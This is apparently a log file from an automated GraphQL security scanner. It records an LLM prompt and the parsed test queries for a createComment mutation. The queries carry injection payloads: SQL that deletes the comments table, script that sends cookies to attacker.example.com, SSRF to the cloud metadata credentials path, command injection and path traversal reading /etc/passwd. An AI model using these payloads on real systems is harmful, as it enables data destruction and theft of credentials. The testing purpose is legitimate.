@@ -1,0 +1,56 @@
+{
+  "timestamp": "20251006_072237",
+  "endpoint": "createComment",
+  "prompt": "\n    You are an expert in GraphQL API security testing.\n\n    Goal: generate valid GraphQL queries for the operation shown, to get successful responses (HTTP 200) quickly while exploring robustness and testing for specific vulnerability types.\n\n    \n    CRITICAL REQUIREMENT: You MUST include at least one query for a basic call and EACH of the following vulnerability types:\n    - SQL Injection\n    - XSS Injection\n    - SSRF Injection\n    - OS Command Injection\n    - Path Injection\n    - HTML Injection\n    - Query Deny Bypass (REQUIRES TWO QUERIES: non-aliased and aliased)\n    - Introspection\n    - Field Suggestions\n\n    Strict Requirements:\n    1) Queries must be syntactically valid GraphQL.\n    2) No placeholders like <id>, \"ID!\", \"value\". Use realistic literals or known real values.\n    3) You may attempt injected strings, nulls, overlong strings, and type mismatches where appropriate.\n    4) You may output 1 query(ies) but MUST cover all vulnerability types listed above.\n    5) Do not use the words \"edges\" or \"node\".\n    6) GraphQL is case-sensitive. Match the exact operation name: createComment.\n    7) If there are previous response pairs, use them to generate the query.\n    8) For each vulnerability type, craft queries that specifically test for that vulnerability pattern.\n    9) CRITICAL: Label each query with its vulnerability type using the format: ***<vulnerability_type>*** before each ```graphql block.\n    10) SPECIAL CASE: For Query Deny Bypass, you MUST generate TWO queries:\n        - First query: Non-aliased version (normal query structure)\n        - Second query: Aliased version (using query aliases like \"s: queryName\")\n        Both queries should test the same operation but with different structures to test access control bypass.\n    \n        Schema not provided: explore plausibly.\n        - Prefer fields/args seen in prior successful responses or known real values.\n        - Introduce at most 1–2 new fields per query.\n        - Keep selection depth minimal to maximize validity.\n        \n    Context:\n    - operation: createComment\n    - input (declared): createComment, input: {'input': 'CreateCommentInput!'}\n    - node type: mutation\n    - known real values: \n    \n    Argument strategy: synthesize realistic literals by type (e.g., ISO dates, small integers, emails, UUIDv4), avoid placeholders.\n    Selection depth target: 1. Keep nested selections no deeper than 1 levels.\n    \n    Output format:\n    Each query must be in its own fenced block with a vulnerability type label:\n    Vulnerability Type Labels Are:\n    - SQL_Injection\n    - XSS_Injection\n    - SSRF_Injection\n    - OS_Command_Injection\n    - Path_Injection\n    - HTML_Injection\n    - Query_Deny_Bypass_Non_Aliased\n    - Query_Deny_Bypass_Aliased\n    - Introspection\n    - Field_Suggestions\n    - Basic_Call\n\n    ***<Vulnerability Type>***\n    ```graphql\n    <your query>\n    ```\n    \n    Example:\n    ***SQL_Injection***\n    ```graphql\n    query {\n      users(filter: \"1' OR '1'='1\") {\n        id\n        name\n      }\n    }\n    ```\n    \n    ***XSS_Injection***\n    ```graphql\n    query {\n      search(term: \"<script>alert('xss')</script>\") {\n        results\n      }\n    }\n    ```\n    ",
+  "llm_response": "```",
+  "parsed_queries": {
+    "query": [
+      {
+        "query": "\nmutation {\n  createComment(input: {\n    content: \"Great article — thanks for sharing!\",\n    authorName: \"Jane Doe\",\n    authorEmail: \"jane.doe@example.com\",\n    postId: \"a3f1c7e4-9b2b-4d7f-9112-6d1b4c8f0b9e\",\n    createdAt: \"2025-10-01T12:34:56Z\"\n  }) {\n    id\n    content\n    createdAt\n    authorEmail\n  }\n}\n",
+        "vulnerability_type": "basic_call"
+      },
+      {
+        "query": "\nmutation {\n  createComment(input: {\n    content: \"Nice post'); DELETE FROM comments; --\",\n    authorName: \"Attacker\",\n    authorEmail: \"attacker@example.com\",\n    postId: \"a3f1c7e4-9b2b-4d7f-9112-6d1b4c8f0b9e\"\n  }) {\n    id\n    content\n  }\n}\n",
+        "vulnerability_type": "sql_injection"
+      },
+      {
+        "query": "\nmutation {\n  createComment(input: {\n    content: \"<script>fetch('https://attacker.example.com/steal?c='+document.cookie)</script>\",\n    authorName: \"Eve\",\n    authorEmail: \"eve@example.org\",\n    postId: \"a3f1c7e4-9b2b-4d7f-9112-6d1b4c8f0b9e\"\n  }) {\n    id\n    content\n  }\n}\n",
+        "vulnerability_type": "xss_injection"
+      },
+      {
+        "query": "\nmutation {\n  createComment(input: {\n    content: \"Referencing internal resource\",\n    authorName: \"Scanner\",\n    authorEmail: \"scanner@example.net\",\n    postId: \"a3f1c7e4-9b2b-4d7f-9112-6d1b4c8f0b9e\",\n    sourceUrl: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n  }) {\n    id\n    content\n    sourceUrl\n  }\n}\n",
+        "vulnerability_type": "ssrf_injection"
+      },
+      {
+        "query": "\nmutation {\n  createComment(input: {\n    content: \"Routine comment; cat /etc/passwd\",\n    authorName: \"CmdTest\",\n    authorEmail: \"cmdtest@example.com\",\n    postId: \"a3f1c7e4-9b2b-4d7f-9112-6d1b4c8f0b9e\"\n  }) {\n    id\n    content\n  }\n}\n",
+        "vulnerability_type": "os_command_injection"
+      },
+      {
+        "query": "\nmutation {\n  createComment(input: {\n    content: \"See attachment\",\n    authorName: \"PathTester\",\n    authorEmail: \"path.tester@example.com\",\n    postId: \"a3f1c7e4-9b2b-4d7f-9112-6d1b4c8f0b9e\",\n    attachmentPath: \"/var/www/uploads/../../../../etc/passwd\"\n  }) {\n    id\n    attachmentPath\n    content\n  }\n}\n",
+        "vulnerability_type": "path_injection"
+      },
+      {
+        "query": "\nmutation {\n  createComment(input: {\n    content: \"<div style=\\\"background:#ffdddd\\\">Injected HTML fragment</div>\",\n    authorName: \"HTMLProbe\",\n    authorEmail: \"html.probe@example.com\",\n    postId: \"a3f1c7e4-9b2b-4d7f-9112-6d1b4c8f0b9e\"\n  }) {\n    id\n    content\n  }\n}\n",
+        "vulnerability_type": "html_injection"
+      },
+      {
+        "query": "\nmutation {\n  createComment(input: {\n    content: \"ACL bypass test - non-aliased\",\n    authorName: \"BypassTester\",\n    authorEmail: \"bypass.tester@example.com\",\n    postId: \"a3f1c7e4-9b2b-4d7f-9112-6d1b4c8f0b9e\",\n    privileged: true\n  }) {\n    id\n    content\n    authorEmail\n  }\n}\n",
+        "vulnerability_type": "query_deny_bypass_non_aliased"
+      },
+      {
+        "query": "\nmutation {\n  s: createComment(input: {\n    content: \"ACL bypass test - aliased\",\n    authorName: \"BypassTester\",\n    authorEmail: \"bypass.tester@example.com\",\n    postId: \"a3f1c7e4-9b2b-4d7f-9112-6d1b4c8f0b9e\",\n    privileged: true\n  }) {\n    id\n    content\n    authorEmail\n  }\n}\n",
+        "vulnerability_type": "query_deny_bypass_aliased"
+      },
+      {
+        "query": "\nquery {\n  createComment {\n    types {\n      name\n    }\n  }\n}\n",
+        "vulnerability_type": "introspection"
+      },
+      {
+        "query": "\nmutation {\n  createComment(input: {\n    content: \"Testing field suggestions for misspellings\",\n    authorName: \"SuggestTester\",\n    authorEmail: \"suggest.tester@example.com\",\n    postId: \"a3f1c7e4-9b2b-4d7f-9112-6d1b4c8f0b9e\"\n  }) {\n    id\n    autherEmal\n    contnt\n  }\n}\n",
+        "vulnerability_type": "field_suggestions"
+      }
+    ]
+  },
+  "approx_tokens": 800.5,
+  "request_time": "2025-10-06T07:22:37.029235"
+}
